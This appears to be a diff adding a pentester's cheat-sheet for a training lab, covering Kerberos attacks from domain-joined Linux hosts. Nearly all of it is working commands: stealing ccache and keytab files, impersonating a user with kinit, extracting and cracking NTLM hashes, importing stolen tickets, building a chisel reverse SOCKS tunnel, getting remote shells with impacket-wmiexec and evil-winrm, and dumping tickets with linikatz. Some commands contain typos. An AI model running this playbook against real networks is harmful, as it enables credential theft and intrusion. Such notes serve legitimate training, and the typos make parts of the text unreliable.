@@ -1,0 +1,136 @@
+A Linux computer connected to Active Directory commonly uses Kerberos as authentication.
+It is not a requirement to be joined to the domain to use Kerberos tickets from a Linux machine.
+
+
+PRIV-ESC QUICKY:
+sudo su
+
+
+WHERE TO FIND TICKEETS:
+/tmp (as ccache files)
+environment variable KRB5CCNAME
+
+
+FINDING CCACHE FILES:
+env | grep -i krb5
+(the files will have krb5cc in the name)
+
+
+LINUX AUTH VIA PORT FORWARD
+ssh <username>@<domain-name>@<target-ip> -p <target-port>
+
+
+
+TO IDENTIFY IF A LINUX MACHINE IS DOMAIN-JOINED (like for Kerberos):
+on target:
+realm list
+or:
+ps -ef | grep -i "winbind\|sssd"
+
+
+KEYTAB FILES:
+allows scripts to authenticate automatically using Kerberos w/o human interaction
+
+Finding keytab w/ FIND:
+find / -name *keytab* -ls 2>/dev/null
+or in cronjobs:
+crontab -l
+(look for 'kinit'; it means Kerberos is in use)
+
+
+
+
+
+ABUSING KEYTAB FILES:
+klist -k -t /opt/specialfiles/carlos.keytab 
+
+Impersonating User w/ keytabs:
+klist
+kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab
+klist
+
+Attempt to connect to SMB share as carlos:
+smbclient //dc01/carlos -k -c ls
+
+
+
+
+EXTRACTING SECRETS FROM KEYTAB FILES:
+python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab
+(this should probide a ntlm hash for the user)
+
+You can crack the ntlm hash via crackstation, hashcat, or john
+
+
+
+
+ABUSING KEYTAB CCACHE:
+You just need read privs on the file to abuse the ccache.
+Located in /tmp
+ls- la /tmp
+
+Repeat the process above and: READ FILE, CRACK THE NTLM ON FILE, login!
+
+To check group memberships (priv checkingg):
+id user@innlanefreight.htb
+
+Importing the ccache into our current session (ASSIGNING OUR TICKET):
+klist
+cp /tmp/krb5cc_13253463456 .
+export KRB5CCNAME=/root/krb5cc_13253463456
+klist
+
+
+
+LINUX ATTACK W/ KERBEROS:
+cat /etc/hosts
+cat /etc/proxychains.conf
+
+
+
+CHISEL TO ATTACK:
+(on host)
+wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
+gzip -d chisel_1.7.7_linux_amd64.gz
+mv chisel_* chisel && chmod +x ./chisel
+sudo ./chisel server --reverse 
+
+(then on target)
+xfreerdp /v:10.129.204.23 /u:david /d:inlanefreight.htb /p:Password2 /dynamic-resolution
+
+Execute chisel from ^:
+chisel.exe client <host-ip>:<host-port> R:socks
+
+
+
+USING IMPACKET W/ PROXYCHAINS AND KERBEROS AUTH:
+proxychains impacket-wmiexec dc01 -l
+
+
+
+USING EVIL-WINRM W/ KERBEROS:
+sudo apt-get innstall krb5-user -y
+
+change the kerberos config file
+cat /etc/krb5.conf
+[libdefaults]
+        default_realm = INLANEFREIGHT.HTB
+...SNIP...
+[realms]
+    INLANEFREIGHT.HTB = {
+        kdc = dc01.inlanefreight.htb
+    }
+...SNIP...
+
+now you can run evil-winrm:
+proxychains evil-winrm -i dc01 -r inlanefreight.htb
+
+
+
+LINIKATZ:
+a tool created by Cisco's sec team, which functions like mimikatz but targets linux machines.
+
+wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
+/opt/linikatz.sh
+
+This should give you many tickets.
